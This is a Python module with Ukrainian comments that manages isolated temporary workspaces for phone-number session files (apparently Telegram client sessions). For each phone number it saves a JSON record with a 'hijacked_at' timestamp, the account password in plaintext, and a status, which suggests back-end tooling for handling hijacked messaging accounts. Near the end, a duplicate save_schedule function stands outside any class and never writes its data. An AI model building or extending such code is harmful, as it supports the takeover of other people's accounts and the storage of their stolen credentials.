# workspace_manager.py
import os
import shutil
import tempfile
import uuid
import time
import asyncio
from typing import Optional, Dict, Any
import logging
from datetime import datetime
import json

logger = logging.getLogger(__name__)


class IsolatedWorkspace:
    def __init__(self, user_id: int, phone: str):
        self.user_id = user_id
        self.phone = phone
        self.workspace_id = f"{user_id}_{int(time.time())}_{uuid.uuid4().hex[:8]}"
        self.base_path = f"/tmp/workspaces/{self.workspace_id}"

        # Створюємо структуру папок
        self.sessions_dir = os.path.join(self.base_path, "sessions")
        self.chats_dir = os.path.join(self.base_path, "chats")
        self.schedule_file = os.path.join(self.base_path, f"schedule_{phone}.json")

        self._create_workspace()

    def _create_workspace(self):
        """Створює ізольований робочий простір"""
        os.makedirs(self.sessions_dir, exist_ok=True)
        os.makedirs(self.chats_dir, exist_ok=True)
        logger.info(f"Створено workspace {self.workspace_id} для користувача {self.user_id}")

    def get_session_path(self) -> str:
        """Повертає шлях до сесійного файлу"""
        session_name = f"{self.phone.replace('+', '')}.session"
        return os.path.join(self.sessions_dir, session_name)

    async def save_schedule(self, password: str):
        """Зберігає schedule для цього workspace"""
        schedule_data = {
            self.phone: {
                "hijacked_at": datetime.now().isoformat(),
                "password": password,
                "status": "pending"
            }
        }

        with open(self.schedule_file, 'w', encoding='utf-8') as f:
            json.dump(schedule_data, f, indent=4, ensure_ascii=False)

        logger.info(f"Schedule збережено для {self.phone} у workspace {self.workspace_id}")

    async def mark_as_finished(self):
        """Перейменовує папку, позначаючи як завершену"""
        finished_path = f"/tmp/workspaces/finished_{self.workspace_id}"
        try:
            shutil.move(self.base_path, finished_path)
            logger.info(f"Workspace {self.workspace_id} позначено як завершений")
            return True
        except Exception as e:
            logger.error(f"Помилка при позначенні workspace як завершеного: {e}")
            return False

    def cleanup(self):
        """Видаляє workspace у разі помилки"""
        try:
            shutil.rmtree(self.base_path, ignore_errors=True)
            logger.info(f"Workspace {self.workspace_id} видалено")
        except Exception as e:
            logger.error(f"Помилка при видаленні workspace: {e}")


class WorkspaceManager:
    def __init__(self):
        self.active_workspaces: Dict[int, IsolatedWorkspace] = {}
        self.workspace_lock = asyncio.Lock()

    async def create_workspace(self, user_id: int, phone: str) -> IsolatedWorkspace:
        """Створює новий ізольований workspace"""
        async with self.workspace_lock:
            # Очищуємо попередні workspace для цього користувача
            if user_id in self.active_workspaces:
                self.active_workspaces[user_id].cleanup()
                del self.active_workspaces[user_id]

            workspace = IsolatedWorkspace(user_id, phone)
            self.active_workspaces[user_id] = workspace
            return workspace

    async def get_workspace(self, user_id: int) -> Optional[IsolatedWorkspace]:
        """Повертає активний workspace для користувача"""
        return self.active_workspaces.get(user_id)

    async def remove_workspace(self, user_id: int):
        """Видаляє workspace користувача"""
        async with self.workspace_lock:
            if user_id in self.active_workspaces:
                self.active_workspaces[user_id].cleanup()
                del self.active_workspaces[user_id]

async def save_schedule(self, password: str, status: str = "pending"):
    """Зберігає schedule для цього workspace"""
    schedule_data = {
        self.phone: {
            "hijacked_at": datetime.now().isoformat(),
            "password": password,
            "status": status
        }
    }


# Глобальний екземпляр
workspace_manager = WorkspaceManager()